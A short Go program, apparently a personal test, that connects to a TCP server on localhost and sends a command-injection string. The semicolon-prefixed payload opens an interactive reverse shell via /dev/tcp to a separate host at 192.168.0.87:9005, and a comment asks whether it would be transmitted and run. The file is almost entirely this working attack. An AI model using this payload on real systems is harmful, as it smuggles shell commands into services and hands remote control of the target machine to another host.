package main

import (
	"fmt"
	"net"
)

func main() {
	// Connect to the server
	conn, err := net.Dial("tcp", "localhost:9803")
	if err != nil {
		fmt.Println(err)
		return
	}

	_, err = conn.Write([]byte("; sh -i >& /dev/tcp/192.168.0.87/9005 0>&1")) //Could this be transmitted and ran?

	if err != nil {
		fmt.Println("BROKE")
		return
	}
	conn.Close()
}
